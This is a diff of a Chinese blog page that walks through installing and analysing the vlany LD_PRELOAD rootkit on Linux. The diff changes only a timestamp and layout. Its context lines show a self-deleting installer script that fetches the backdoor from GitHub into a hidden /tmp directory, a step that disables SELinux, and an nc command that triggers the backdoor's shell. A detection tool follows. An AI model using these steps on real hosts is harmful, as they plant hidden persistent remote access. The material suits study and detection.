@@ -120,7 +120,7 @@
 <meta property="og:image" content="https://kionf.com/article_images/vlany-08.jpg">
 <meta property="og:image" content="https://kionf.com/article_images/vlany-09.jpg">
 <meta property="og:image" content="https://kionf.com/article_images/vlany-10.jpg">
-<meta property="og:updated_time" content="2018-10-31T10:09:33.532Z">
+<meta property="og:updated_time" content="2018-10-31T10:10:36.138Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux动态链接库预加载型后门，Vlany安装及分析">
 <meta name="twitter:description" content="此工具vlany通过LD_PRELOAD环境变量和/etc/ld.so.preload的配置文件来重写系统调用函数，加载攻击者自定义的恶意函数。">
@@ -445,7 +445,8 @@
 <p><br></p>
 <p>编辑文件<code>quick_install.sh</code>：</p>
 <figure class="highlight shell"><figcaption><span class="caption">后门安装脚本</span><a href="https://github.com/mempodippy/vlany" target="_blank">项目地址</a></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></div><div class="line"></div><div class="line">[ $(id -u) != 0 ] &amp;&amp; &#123; echo "Not root. Exiting."; exit; &#125;</div><div class="line"></div><div class="line">WORKING_DIR="/tmp/.$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"</div><div class="line">ARCHIVE_NAME="$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1).tar.gz"</div><div class="line"></div><div class="line">mkdir $WORKING_DIR &amp;&amp; cd $WORKING_DIR</div><div class="line">wget https://github.com/mempodippy/vlany/archive/master.tar.gz -O $ARCHIVE_NAME</div><div class="line">tar xvpfz $ARCHIVE_NAME &amp;&amp; rm $ARCHIVE_NAME</div><div class="line">cd vlany-master</div><div class="line">chmod +x install.sh</div><div class="line marked">./install.sh</div><div class="line"></div><div class="line">rm -rf $WORKING_DIR</div><div class="line"><span class="meta">#</span><span class="bash">下载完后删除项目</span></div><div class="line">rm -f $0</div><div class="line"><span class="meta">#</span><span class="bash">执行后删除自身脚本</span></div></pre></div></div></figure>
-<p><br></p>
+<hr>
+
 <h1 id="0x02-编译安装"><a href="#0x02-编译安装" class="headerlink" title="0x02 编译安装"></a>0x02 编译安装</h1><div class="note danger"><p><code>quick_install.sh</code>下载项目后解压调用<code>install.sh</code>脚本，首先会检测SElinux是否关闭如果没关闭，脚本会关闭SElinux。此时需要重启机器。</p>
 </div>
 <p>实际应用中，如果不想重启机器，可以单独下载项目执行命令<br><code>wget https://github.com/mempodippy/vlany/archive/master.tar.gz &amp;&amp; tar xvpfz master.tar.gz &amp;&amp; cd vlany-master</code><br>重新建立终端，然后输入<code>setenforce 0</code>，再更改<code>install.sh</code>脚本</p>
@@ -485,6 +486,8 @@
 </div>
 <h2 id="2-accept-后门连接"><a href="#2-accept-后门连接" class="headerlink" title="2. accept()后门连接"></a>2. accept()后门连接</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#accept backdoor low port: 271</span></div><div class="line"><span class="comment">#accept backdoor high port: 274</span></div><div class="line"><span class="comment"># -p 指定 271-274 范围内端口</span></div><div class="line">nc 192.168.10.35 22 -p 271</div><div class="line"><span class="comment">#输入设定的accept密码后回车</span></div><div class="line">***REMOVED***</div><div class="line"> [+] shell dropped</div></pre></div></div></figure>
 <p><strong>accept()后门在实际测试中没有成功，由于内核版本等问题。</strong></p>
+<hr>
+
 <h1 id="0x04-检测"><a href="#0x04-检测" class="headerlink" title="0x04 检测"></a>0x04 检测</h1><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/mempodippy/detect_preload.git &amp;&amp; cd detect_preload &amp;&amp; ./detect_preload</div></pre></div></div></figure>
 <p>执行以上小程序查看输出</p>
 <figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">[+] finished basic checks</div><div class="line"></div><div class="line">0x7f0144ca2000 /lib64/libdl.so.2</div><div class="line">0x7f014490a000 /lib64/libc.so.6</div><div class="line">0x7f01446ca000 /lib64/libcrypt.so.1</div><div class="line marked">(nil) /lib64/ld-linux-x86-64.so.2</div><div class="line">0x7f01444c2000 /lib64/libfreebl3.so</div></pre></div></div></figure>
